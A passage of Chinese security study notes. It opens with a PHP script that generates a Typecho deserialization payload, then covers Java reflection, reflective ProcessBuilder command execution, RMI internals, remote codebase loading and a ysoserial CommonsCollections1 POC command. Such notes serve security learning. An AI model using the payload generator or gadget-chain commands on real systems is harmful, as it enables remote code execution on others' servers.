<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">	class Typecho_Feed&#123;</span><br><span class="line">		private $_type;</span><br><span class="line">		private $_items = array();</span><br><span class="line"></span><br><span class="line">		public function __construct()&#123;</span><br><span class="line">			$this-&gt;_type = &quot;RSS 2.0&quot;;   //因为feed.php中else if (self::RSS2 == $this-&gt;_type)必须为RSS2.0时才能进入elseif</span><br><span class="line">			$this-&gt;_items = array(      //一次从item中循环每一个属性</span><br><span class="line">				array(</span><br><span class="line">					&quot;title&quot; =&gt; &quot;test&quot;,</span><br><span class="line">					&quot;link&quot; =&gt; &quot;test&quot;,</span><br><span class="line">					&quot;data&quot; =&gt; &quot;20190430&quot;,</span><br><span class="line">					&quot;author&quot; =&gt; new Typecho_Request(),   //前三个乱传，最后一个author传入Typecho_Request,因为里面没有screenName属性</span><br><span class="line">				),</span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Typecho_Request&#123;</span><br><span class="line">		private $_params = array();</span><br><span class="line">		private $_filter = array();</span><br><span class="line"></span><br><span class="line">		public function __construct()&#123;</span><br><span class="line">			$this-&gt;_params = array(</span><br><span class="line">				&quot;screenName&quot; =&gt; &quot;eval(&#x27;phpinfo();exit;&#x27;)&quot;,</span><br><span class="line">			);</span><br><span class="line">			$this-&gt;_filter = array(&quot;assert&quot;);          //call_user_func($filter, $value);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$a = new Typecho_Feed();</span><br><span class="line"></span><br><span class="line">	$c = array(</span><br><span class="line">		&quot;adapter&quot; =&gt; $a,</span><br><span class="line">		&quot;prefix&quot; =&gt; &quot;test&quot;,               //$adapterName = &#x27;Typecho_Db_Adapter_&#x27; . $adapterName;s</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	echo base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>
<p>传入上面的 payload 后，被反序列化，恶意代码执行</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGl0bGlmZS9wLzEwNzk4MDYxLmh0bWw=">Typecho - 反序列化漏洞学习 - ka1n4t - 博客园 (cnblogs.com)</span></p>
<h2 id="2java"><a class="markdownIt-Anchor" href="#2java">#</a> 2.java</h2>
<h3 id="反射"><a class="markdownIt-Anchor" href="#反射">#</a> 反射</h3>
<p>Java 的反射是指程序在运行期可以拿到一个对象的所有信息。</p>
<p>所以，反射是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法。</p>
<p>这种通过 <code>Class</code>  实例获取 <code>class</code>  信息的方法称为反射（Reflection）。</p>
<p>如何获取一个 <code>class</code>  的 <code>Class</code>  实例？有三个方法：</p>
<p>方法一：直接通过一个 <code>class</code>  的静态变量 <code>class</code>  获取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = String.class;</span><br></pre></td></tr></table></figure>
<p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的 <code>getClass()</code>  方法获取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s = &quot;Hello&quot;;</span><br><span class="line">Class cls = s.getClass();</span><br></pre></td></tr></table></figure>
<p>方法三：如果知道一个 <code>class</code>  的完整类名，可以通过静态方法 <code>Class.forName()</code>  获取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure>
<p><code>Class</code>  类提供了以下几个方法来获取字段：</p>
<ul>
<li>Field getField (name)：根据字段名获取某个 public 的 field（包括父类）</li>
<li>Field getDeclaredField (name)：根据字段名获取当前类的某个 field（不包括父类）</li>
<li>Field [] getFields ()：获取所有 public 的 field（包括父类）</li>
<li>Field [] getDeclaredFields ()：获取当前类的所有 field（不包括父类）</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">stdClass</span> <span class="operator">=</span> Student.class;</span><br><span class="line">        <span class="comment">// 获取public字段&quot;score&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>));</span><br><span class="line">        <span class="comment">// 获取继承的public字段&quot;name&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">// 获取private字段&quot;grade&quot;:</span></span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个 <code>Field</code>  对象包含了一个字段的所有信息：</p>
<ul>
<li><code>getName()</code> ：返回字段名称，例如， <code>&quot;name&quot;</code> ；</li>
<li><code>getType()</code> ：返回字段类型，也是一个 <code>Class</code>  实例，例如， <code>String.class</code> ；</li>
<li><code>getModifiers()</code> ：返回字段的修饰符，它是一个 <code>int</code> ，不同的 bit 表示不同的含义。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> String.class.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">f.getName(); <span class="comment">// &quot;value&quot;</span></span><br><span class="line">f.getType(); <span class="comment">// class [B 表示byte[]类型</span></span><br><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> f.getModifiers();</span><br><span class="line">Modifier.isFinal(m); <span class="comment">// true</span></span><br><span class="line">Modifier.isPublic(m); <span class="comment">// false</span></span><br><span class="line">Modifier.isProtected(m); <span class="comment">// false</span></span><br><span class="line">Modifier.isPrivate(m); <span class="comment">// true</span></span><br><span class="line">Modifier.isStatic(m); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>拿到字段值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Xiao Ming&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> p.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> f.get(p);</span><br><span class="line">        System.out.println(value); <span class="comment">// &quot;Xiao Ming&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>正常情况下， <code>Main</code>  类无法访问 <code>Person</code>  类的 <code>private</code>  字段。要修复错误，可以将 <code>private</code>  改为 <code>public</code> ，或者，在调用 <code>Object value = f.get(p);</code>  前，先写一句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.setAccessible(true);</span><br></pre></td></tr></table></figure>
<p>调用 <code>Field.setAccessible(true)</code>  的意思是，别管这个字段是不是 <code>public</code> ，一律允许访问。</p>
<p><code>f.set(p, &quot;Xiao Hong&quot;);</code>  修改字段值</p>
<p>同样的，可以通过 <code>Class</code>  实例获取所有 <code>Method</code>  信息。 <code>Class</code>  类提供了以下几个方法来获取 <code>Method</code> ：</p>
<ul>
<li><code>Method getMethod(name, Class...)</code> ：获取某个 <code>public</code>  的 <code>Method</code> （包括父类）</li>
<li><code>Method getDeclaredMethod(name, Class...)</code> ：获取当前类的某个 <code>Method</code> （不包括父类）</li>
<li><code>Method[] getMethods()</code> ：获取所有 <code>public</code>  的 <code>Method</code> （包括父类）</li>
<li><code>Method[] getDeclaredMethods()</code> ：获取当前类的所有 <code>Method</code> （不包括父类）</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">stdClass</span> <span class="operator">=</span> Student.class;</span><br><span class="line">    <span class="comment">// 获取public方法getScore，参数为String:</span></span><br><span class="line">    System.out.println(stdClass.getMethod(<span class="string">&quot;getScore&quot;</span>, String.class));</span><br><span class="line">    <span class="comment">// 获取继承的public方法getName，无参数:</span></span><br><span class="line">    System.out.println(stdClass.getMethod(<span class="string">&quot;getName&quot;</span>));</span><br><span class="line">    <span class="comment">// 获取private方法getGrade，参数为int:</span></span><br><span class="line">    System.out.println(stdClass.getDeclaredMethod(<span class="string">&quot;getGrade&quot;</span>, <span class="type">int</span>.class));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>调用方法</strong>。如果用反射来调用 <code>substring</code>  方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// String对象:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        <span class="comment">// 获取String substring(int)方法，参数为int:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 在s对象上调用该方法并获取结果:</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> (String) m.invoke(s, <span class="number">6</span>);</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>调用静态方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取Integer.parseInt(String)方法，参数为String:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Integer.class.getMethod(<span class="string">&quot;parseInt&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 调用该静态方法并获取结果:</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> (Integer) m.invoke(<span class="literal">null</span>, <span class="string">&quot;12345&quot;</span>);</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用非 public 方法</p>
<p><code> m.setAccessible(true);</code></p>
<p>多态：调用子类和父类都存在该方法时，调用子类方法</p>
<p>如果通过反射来创建新的实例，可以调用 Class 提供的 newInstance () 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person p = Person.class.newInstance();</span><br></pre></td></tr></table></figure>
<p>它只能调用该类的 public 无参数构造方法。如果构造方法带有参数，或者不是 public，就无法直接通过 Class.newInstance () 来调用。</p>
<p>获取有参方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取构造方法Integer(int):</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons1</span> <span class="operator">=</span> Integer.class.getConstructor(<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 调用构造方法:</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n1</span> <span class="operator">=</span> (Integer) cons1.newInstance(<span class="number">123</span>);</span><br><span class="line">        System.out.println(n1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取构造方法Integer(String)</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons2</span> <span class="operator">=</span> Integer.class.getConstructor(String.class);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n2</span> <span class="operator">=</span> (Integer) cons2.newInstance(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">        System.out.println(n2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用非 <code>public</code>  的 <code>Constructor</code>  时，必须首先通过 <code>setAccessible(true)</code>  设置允许访问。 <code>setAccessible(true)</code>  可能会失败。</p>
<p>我们常用的另一种执行命令的方式 ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start () 来执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();</span><br></pre></td></tr></table></figure>
<p>不用强制类型转换时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(  Arrays.asList(&quot;calc.exe&quot;)));</span><br></pre></td></tr></table></figure>
<p>反射可以提供动态特性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void execute(String className, String methodName) throws Exception &#123;</span><br><span class="line">Class clazz = Class.forName(className);</span><br><span class="line">clazz.getMethod(methodName).invoke(clazz.newInstance());  	&#125;</span><br></pre></td></tr></table></figure>
<p><code>import java.lang.Runtime;</code>  该类可以用于执行任意命令</p>
<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用 forName 就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
<h3 id="rmi"><a class="markdownIt-Anchor" href="#rmi">#</a> RMI</h3>
<p>RMI 是 Remote Method Invocation 的缩写。</p>
<p>要实现 RMI，服务器和客户端必须共享同一个接口。我们定义一个 <code>WorldClock</code>  接口，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface WorldClock extends Remote &#123;</span><br><span class="line">    LocalDateTime getLocalDateTime(String zoneId) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java 的 RMI 规定此接口必须派生自 <code>java.rmi.Remote</code> ，并在每个方法声明抛出 <code>RemoteException</code> 。</p>
<p>下一步是编写服务器的实现类，因为客户端请求的调用方法 <code>getLocalDateTime()</code>  最终会通过这个实现类返回结果。实现类 <code>WorldClockService</code>  代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class WorldClockService implements WorldClock &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public LocalDateTime getLocalDateTime(String zoneId) throws RemoteException &#123;</span><br><span class="line">        return LocalDateTime.now(ZoneId.of(zoneId)).withNano(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要通过 Java RMI 提供的一系列底层支持接口，把上面编写的服务以 RMI 的形式暴露在网络上，客户端才能调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;create World clock remote service...&quot;);</span><br><span class="line">        // 实例化一个WorldClock:</span><br><span class="line">        WorldClock worldClock = new WorldClockService();</span><br><span class="line">        // 将此服务转换为远程服务接口:</span><br><span class="line">        WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0);</span><br><span class="line">        // 将RMI服务注册到1099端口:</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        // 注册此服务，服务名为&quot;WorldClock&quot;:</span><br><span class="line">        registry.rebind(&quot;WorldClock&quot;, skeleton);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码主要目的是通过 RMI 提供的相关类，将我们自己的 <code>WorldClock</code>  实例注册到 RMI 服务上。RMI 的默认端口是 <code>1099</code> ，最后一步注册服务时通过 <code>rebind()</code>  指定服务名称为 <code>&quot;WorldClock&quot;</code> 。</p>
<p>下一步我们就可以编写客户端代码。RMI 要求服务器和客户端共享同一个接口，因此我们要把 <code>WorldClock.java</code>  这个接口文件复制到客户端，然后在客户端实现 RMI 调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException &#123;</span><br><span class="line">        // 连接到服务器localhost，端口1099:</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class="line">        // 查找名称为&quot;WorldClock&quot;的服务并强制转型为WorldClock接口:</span><br><span class="line">        WorldClock worldClock = (WorldClock) registry.lookup(&quot;WorldClock&quot;);</span><br><span class="line">        // 正常调用接口方法:</span><br><span class="line">        LocalDateTime now = worldClock.getLocalDateTime(&quot;Asia/Shanghai&quot;);</span><br><span class="line">        // 打印调用结果:</span><br><span class="line">        System.out.println(now);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Java 的 RMI 严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为 Java 的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证 100% 排除恶意构造的字节码。</p>
<p>这就是完整的通信过程，我们可以发现，整个过程进行了两次 TCP 握手，也就是我们实际建立了两次<br>
 TCP 连接。<br>
第一次建立 TCP 连接是连接远端 192.168.135.142 的 1099 端口，这也是我们在代码里看到的端口，二 者进行沟通后，我向远端发送了一个 “Call” 消息，远端回复了一个 “ReturnData” 消息，然后我新建了一 个 TCP 连接，连到远端的 33769 端口。</p>
<p>细细阅读数据包我们会发现，在 “ReturnData” 这个包中，返回了目标的 IP 地址 192.168.135.142 ，其 后跟的一个字节 \x00\x00\x83\xE9 ，刚好就是整数 33769 的网络序列：</p>
<p>首先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据 流中的 Call 消息；然后 Registry 返回一个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应 数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是一个远程对象，地址<br>
在 192.168.135.142:33769 ，于是再与这个地址建立 TCP 连接；在这个新的连接中，才执行真正远程 方法调用，也就是 hello () 。</p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117161651171.png" alt="image-20221117161651171" style="zoom:80%;" />
<p>RMI Registry 就像一个网关，他自己是不会执行远程方法的，但 RMI Server 可以在上面注册一个 Name  到对象的绑定关系；RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI  Server；最后，远程方法实际上在 RMI Server 上调用。</p>
<h3 id="攻击rmi-registry"><a class="markdownIt-Anchor" href="#攻击rmi-registry">#</a> 攻击 RMI registry</h3>
<p>当我们可以访问目标 RMI Registry 的时候</p>
<p>RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的 “后台”。我们可以尝试直 接访问 “后台” 功能，比如修改远程服务器上 Hello 对应的对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RemoteHelloWorld h = new RemoteHelloWorld();</span><br><span class="line">Naming.rebind(&quot;rmi://192.168.135.142:1099/Hello&quot;, h);</span><br></pre></td></tr></table></figure>
<p>Java 对远程访问 RMI Registry 做了限制，只有来源地址是 localhost 的时候，才能调用 rebind、  bind、unbind 等方法。</p>
<p>codebase 是一个地址，告诉 Java 虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的  CLASSPATH，但 CLASSPATH 是本地路径，而 codebase 通常是远程 URL，比如 http、ftp 等。<br>
如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则 Java 虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为 Example 类的字节码。</p>
<p>RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载 codebase 中的类。</p>
<p>在 RMI 中，我们是可以将 codebase 随着序列化数据一起传输的，服务器在接收到这个数据后就会去<br>
 CLASSPATH 和指定的 codebase 寻找类，由于 codebase 被控制导致任意命令执行漏洞。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117164157276.png" alt="image-20221117164157276"></p>
<p>所以只有满足如下条件的 RMI 服务器才能被攻击： 安装并配置了 SecurityManager</p>
<p>Java 版本低于 7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</p>
<p>我们只需要编译一个恶意类，将其 class 文件放置在 Web 服务器的 / RMIClient$Payload.class 即可。</p>
<p>我们使用 SerializationDumper 查看这段序列化数据：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117170707850.png" alt="image-20221117170707850"></p>
<p>可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。<br>
所以，即使我们没有 RMI 的客户端，只需要修改 classAnnotations 的值，就能控制 codebase，使其 指向攻击者的恶意网站。</p>
<p>在序列化 Java 类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法  annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>
<p>我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的内容。</p>
<p>Java 在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是  ObjectOutputStream ，开发者可以将任何内容写入这个 stream 中；反序列化时，会调用  readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>
<p>我们写入的字符串被放在 objectAnnotation 的位置。在反序列化时，我读取了这个字符串，并将其输出：，是在 writeobject 写入</p>
<p>ysoserial 可以让用户根据自己选择的利用链，生成反 序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。</p>
<p>利用链也叫 “gadget chains”，我们通常称为 gadget。如果你学过 PHP 反序列化漏洞，那么就可以将  gadget 理解为一种方法，它连接的是从触发位置开始到执行命令的位置结束</p>
<p>ysoserial 大部分的 gadget 的参数就是一条命令，比如这里是 id 。生成好的 POC 发送给目标，如 果目标存在反序列化漏洞，并满足这个 gadget 对应的条件，则命令 id 将被执行</p>
<p>用 ysoserial 可以很容 易地生成这个 gadget 对应的 POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>
<h3 id="序列化和反序列化"><a class="markdownIt-Anchor" href="#序列化和反序列化">#</a> 序列化和反序列化</h3>
